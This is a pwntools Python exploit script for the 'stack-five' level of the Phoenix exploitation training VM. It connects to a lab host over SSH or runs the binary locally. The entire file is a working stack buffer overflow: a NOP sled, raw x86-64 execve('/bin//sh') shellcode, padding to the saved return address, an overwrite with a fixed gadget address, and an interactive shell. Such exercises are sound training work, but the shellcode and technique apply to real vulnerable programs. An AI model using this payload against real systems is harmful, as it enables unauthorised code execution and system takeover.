#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(terminal=['tmux','new-window'])
exe = context.binary = ELF('stack-five')

host = args.HOST or 'localhost'
port = int(args.PORT or 2222)
user = args.USER or 'user'
password = args.PASSWORD or 'user'
remote_path = '/opt/phoenix/amd64/stack-five'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
set sysroot
b start_level
'''.format(**locals())

# -- Exploit goes here --

io = start()

# nops
shellcode = b'\x90'*0x40
# shellcode
shellcode += b"\x48\x31\xc0\x50\xb0\x3b\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05\xb0\x3c\x48\x31\xff\x0f\x05"

buf = shellcode
buf += b'A'*(128-len(buf)+8)
buf += p64(0x400481)

io.sendline(buf)

io.interactive()
